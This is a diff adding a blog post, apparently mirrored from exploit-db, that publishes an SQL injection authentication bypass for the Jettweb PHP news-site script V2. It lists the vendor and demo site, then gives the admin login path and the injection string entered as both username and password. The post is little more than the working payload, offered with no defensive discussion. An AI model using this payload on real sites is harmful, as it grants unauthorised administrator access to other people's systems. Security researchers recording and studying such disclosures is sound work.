@@ -1,0 +1,23 @@
+---
+layout:     post
+title:      "Jettweb PHP Hazır Haber Sitesi Scripti V2 - Authentication Bypass"
+date:       2019-03-25 12:37
+author:     "Ahmet Ümit BAYRAM"
+category:   exploit
+tags:       [sql, sqli, sql injection, authentication bypass, exploit-db]
+---
+
+# Exploit Title: Jettweb PHP Hazır Haber Sitesi Scripti V2 - Authentication Bypass
+# Date: 25.03.2019
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://jettweb.net/u-6-php-hazir-haber-sitesi-scripti-v2.html
+# Demo Site: http://haberv2.proemlaksitesi.net
+# Version: V2
+# Tested on: Kali Linux
+# CVE: N/A
+
+----- PoC: Authentication Bypass -----
+
+Administration Panel: http://localhost/[PATH]/yonetim/admingiris.php
+Username: '=' 'or'
+Password: '=' 'or'
